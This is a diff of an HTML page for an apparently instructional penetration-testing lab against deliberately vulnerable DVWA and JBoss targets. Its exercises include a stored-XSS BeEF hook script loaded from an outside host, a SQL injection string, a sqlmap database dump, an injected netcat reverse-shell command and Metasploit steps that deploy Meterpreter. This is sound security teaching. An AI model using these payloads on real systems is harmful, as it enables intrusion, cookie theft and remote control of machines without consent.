@@ -193,7 +193,7 @@
 <div class="container">
 <h1>Hacking Web Applications</h1>
 
-
+<h3> Goals </h3>
 
 <ul>
 <li>
@@ -217,9 +217,151 @@
 </ul>
 
 
+<h2>Exercise 1: Prerequisites</h2>
+
+<h3>Task 1</h3>
+Start BurpSuite.
+
+<ul>
+<li>This can be found in Applications <strong>Menu &gt; 03 - Web Application Analysis</strong></li>
+<li>Choose Temporary project, Click <strong>Next</strong></li>
+<li>Choose Use Burp defaults, Click <strong>Start Burp</strong></li>
+<li>Click on the <strong>Proxy tab</strong>, then <strong>Intercept</strong></li>
+<li>Make sure Intercept is <strong>Off</strong>.</li>
+</ul>
+
+<hr>
+<h3>Task 2</h3>
+Set Firefox to use BurpSuite as a proxy and disable captive portal detection
+
+<ul>
+<li>Using Firefox on Kali, browse to <strong>about:config</strong>.</li>
+<li>Choose<strong> I Accept the Risk</strong>. Search for captive. Set network.captive-portal-service.enabled to false.</li>
+<li>Proxy settings can be found in O<strong>pen Menu &rarr; Preferences &rarr; Advanced &rarr; Network &rarr;&nbsp;</strong><strong>Configure how Firefox connects to the Internet &rarr; Settings</strong>...</li>
+<li>Select Manual proxy configuration and make sure HTTP Proxy is set to <strong>localhost</strong> and port <strong>8080</strong></li>
+<li>Using Firefox, browse to <a href="http://metasploitable/dvwa">http://metasploitable/dvwa</a> .</li>
+<li>You should see the request show up in BurpSuite under <strong>HTTP History</strong></li>
+<li>What version of Apache is the server running?</li>
+</ul>
+
+
+<hr>
+<h3>Task 3</h3>
+Log in as smithy / password
+
+<hr>
+<h3>Task 4</h3>
+The security level is displayed at the bottom of the page
+
+<ul>
+<li>
+<p>Change the Security Level of DVWA to <strong>Low</strong>. This can be found in <em><strong>DVWA Security</strong></em>.</p>
+</li>
+<li>
+<p>You'll need to do this if you log out and log back in, or log in from another host<br /><br /></p>
+</li>
+</ul>
+
+
+<hr>
+<h3>Task 5</h3>
+Start the beef-xss service:
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>BeeF</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
+<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+service beef-xss start
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
 
 
 
+<hr>
+<h3>Task 6</h3>
+<p>Make sure you can reach the BeEF UI authentication page at <a href="http://localhost:3000/ui/authentication">http://localhost:3000/ui/authentication</a>&nbsp;</p>
+
+<blockquote> Note: By default, requests to localhost will not be sent to BurpSuite with the default proxy settings. </blockquote>
+
+<p>Log in as <em><strong>beef</strong></em> / <strong><em>beef</em></strong> .</p>
+
+
+<h2>Exercise 2 : Cross Site Scripting</h2>
+<h3>Task 1</h3>
+<ul>
+<li>In a new tab, navigate to <strong>XSS Reflected</strong>. You can view the PHP source code by clicking the <strong>View Source</strong> button at the bottom of the page.</li>
+<li>Try placing your name in the <strong>Textbox</strong> and click <strong>Submit</strong></li>
+<li>From looking at <strong>BurpSuite</strong>, how was your name sent to the server?</li>
+<li>Trigger a reflected <strong>XSS alert</strong> and print out the current document cookie</li>
+<li>Use the Web Developer Tools to help you navigate the DOM (<strong>Tools &rarr; Web Developer &rarr; Inspector</strong>)</li>
+<li>You can also use the Web Console to view a value in the DOM</li>
+</ul>
+
+<h3>Task 2</h3>
+Navigate to XSS Stored. Figure out a way to insert a BeEF Hook:
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>XSS Stored</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 2 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button></div>
+<div class="ciscohl2" id="copy-2" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+&lt;script src="http://192.168.1.2:3000/hook.js" type="text/javascript"&gt;&lt;/script&gt;
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<blockquote>Note: Use the developer tools to modify the maxlength attribute in the textarea tag, or use BurpSuite to intercept and modify the POST message parameters.</blockquote>
+
+
+
+<h3>Task 3</h3>
+<p>Open your Windows desktop and use Firefox to go to DVWA, log in as&nbsp;admin&nbsp;/&nbsp;password</p>
+<ul>
+<li>
+<p>Go to&nbsp;XSS Stored</p>
+</li>
+<li>From the BeEF UI, see if the Windows browser is hooked. If not, figure out why not</li>
+</ul>
+
+<hr><br>
+<h3>Task 4</h3>
+<p>Type your name and a message from Windows in the message and store it</p>
+<ul>
+<li>What version of Firefox is running on the hooked Windows Browser?</li>
+<li>What is the size of the screen?</li>
+<li>See if you can see the characters that were entered in Windows from the Beef UI. You may need to refresh the log<span id="line-66"></span></li>
+<li>Create a prompt dialog with the message of your choice. (Commands &rarr; Browser &rarr; Hooked Domain)</li>
+<li>Finally, get the hooked browser's cookie.</li>
+</ul>
+
+<p><strong>Bonus</strong>:&nbsp;Use the stolen cookie to access the DVWA as admin.</p>
+
+<hr><br>
+<h3>Task 5</h3>
+<p>To keep BeEF from interfering with later labs, release all hooked browsers</p>
+<ul>
+<li>
+<p>Reset the DVWA RDMS Database from&nbsp;Setup</p>
+</li>
+<li>
+<p>Log back in as&nbsp;admin</p>
+</li>
+<li>
+<p>Close the Remote Desktop for&nbsp;<tt>windows</tt></p>
+</li>
+</ul>
+
+<hr>
+<h2>Exercise 3 : SQL Injection</h2>
+<h3>Task 1</h3>
+<p>Navigate to<strong>SQL Injection</strong>. Enumerate users on the system with an SQL injection.</p>
 
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
@@ -233,17 +375,8 @@
       </div>
       <div class="modal-body">
     <div class="row">
-
-
 <pre>
-root@bah-pod1-kali:~/labs/networking# telnet 192.168.3.1
-...
-User Access Verification
-
-Username: admin
-Password:
-...
-router#
+a' or 'a' = 'a
 </pre>
 </div>
 </div>
@@ -259,24 +392,227 @@ router#
 <!--end hint -->
 
 
+<hr>
+<h3>Task 2</h3>
+
+<p>Use SQLMap to dump the database</p>
+<ul>
+<li>You'll need to copy your cookie from the browser</li>
+<li>What RDMS is the target using?</li>
+<li>Skip test payloads for other RDMSes</li>
+<li>Which parameter is injectable?</li>
+<li>What is Pablo Picasso's password?</li>
+</ul>
+
+
 
 <!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
 <div class="topbar">
-<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Netstat</div>
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>SQLMap</div>
 <div class="topbarbutton"></div> </div>
-<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
-<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<div class="commandblock"> <div class="copyseqnumber"> 3 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-3">Copy</button></div>
+<div class="ciscohl2" id="copy-3" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
 <!-- put the code here -->
 <pre>
-netstat -lun | grep 69
+sqlmap --cookie="&lt;cookie&gt;" --url="http://metasploitable/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --string="surname" --dump
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<hr>
+<h2>Exercise 4 : Command Injection</h2>
+<h3>Task 1</h3>
+
+<p>Navigate to&nbsp;<strong>Command Execution</strong>. Inject the command&nbsp;<tt>id</tt></p>
+<ul>
+<li>Use the source Luke!</li>
+<li>
+<p><strong>nano-Hint</strong>: If ping returns an error, you won't see anything</p>
+</li>
+<li>What user is PHP running as?</li>
+</ul>
+
+<hr>
+<h3>Task 2</h3>
+<p>Spawn a&nbsp;<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a>&nbsp;using Netcat.</p>
+
+<hr>
+<h3>Task 2a</h3>
+Start a listener using netcat from Kali:
+
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Create a listener</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 4 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-4">Copy</button></div>
+<div class="ciscohl2" id="copy-4" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+nc -v -l -p 4444
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<hr>
+<h3>Task 2b</h3>
+
+<p>Inject this command:<tt>localhost&nbsp;&amp;&amp;&nbsp;nc&nbsp;-e&nbsp;/bin/bash&nbsp;kali&nbsp;4444</tt></p>
+<ul>
+<li>This will start netcat on the remote host and connect back to you with a shell</li>
+<li>It's normal not to have a prompt -- type commands as you normally would anyway</li>
+</ul>
+
+<hr>
+<h3>Task 3</h3>
+What is the uptime of the system?
+
+<hr><br>
+<h2>Exercise 5 : Intro to Exploits Using Metasploit Against JBoss</h2>
+<h3>Task 1</h3>
+<p><strong>Shut down BurpSuite</strong>. It uses port 8080 which will conflict with JBoss</p>
+<ul>
+<li>
+<p>You may also need to reboot.&nbsp;<tt>reboot</tt></p>
+</li>
+</ul>
+
+<hr>
+<h3>Task 2</h3>
+Run JBoss:
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Run JBoss</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 5 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-5">Copy</button></div>
+<div class="ciscohl2" id="copy-5" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+  cd ~/labs/web-apps
+</pre>
+<pre>
+  ./run-jboss.sh
 </pre>
 </div></div>
 <!-- end of copy /paste block -->
 
 
+<hr>
+<h3>Task 3</h3>
+
+<p>Using Firefox, check that you can connect to JBoss at <a href="http://localhost:8080/">http://localhost:8080</a></p>
+
+<hr>
+<h3>Task 4</h3>
+<p>Using Metasploit, run the&nbsp;<strong>jboss_vulnscan</strong>&nbsp;plugin:</p>
 
 
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Use the auxiliary/scanner/http/jboss_vulnscan module </div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 6 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-6">Copy</button></div>
+<div class="ciscohl2" id="copy-6" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+  use auxiliary/scanner/http/jboss_vulnscan
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
 
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Use info to obtain more information about the module</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 7 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-7">Copy</button></div>
+<div class="ciscohl2" id="copy-7" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+  info
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Set the Remote Host (RHOST)</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 8 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-8">Copy</button></div>
+<div class="ciscohl2" id="copy-8" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+set RHOSTS 127.0.0.1
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Set the Remote Port (RPORT)</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 9 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-9">Copy</button></div>
+<div class="ciscohl2" id="copy-9" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+set RPORT 8080
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Start the exploit</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 10 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-10">Copy</button></div>
+<div class="ciscohl2" id="copy-10" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+exploit
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+
+<hr>
+<h3>Task 5</h3>
+Run Meterpreter through the jboss_invoke_deploy exploit:
+
+
+<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+<div class="topbar">
+<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Similar procedure as the one you just learned, but in this case invoking Meterpreter.</div>
+<div class="topbarbutton"></div> </div>
+<div class="commandblock"> <div class="copyseqnumber"> 11 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-11">Copy</button></div>
+<div class="ciscohl2" id="copy-11" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+<!-- put the code here -->
+<pre>
+use exploit/multi/http/jboss_invoke_deploy
+</pre><pre>
+info
+</pre><pre>
+set RHOST 127.0.0.1
+</pre><pre>
+set RPORT 8080
+</pre><pre>
+set LHOST 127.0.0.1
+</pre><pre>
+set LPORT 5555
+</pre><pre>
+exploit -t 1
+</pre>
+</div></div>
+<!-- end of copy /paste block -->
+
+
+<hr>
+<h3>Task 6</h3>
+List the running processes on the victim.
+<ul>
+<li>
+Use <tt>help</tt>
+</li>
+<li>What other commands look interesting? Try some of them out!</li>
+</ul>
 
 
 
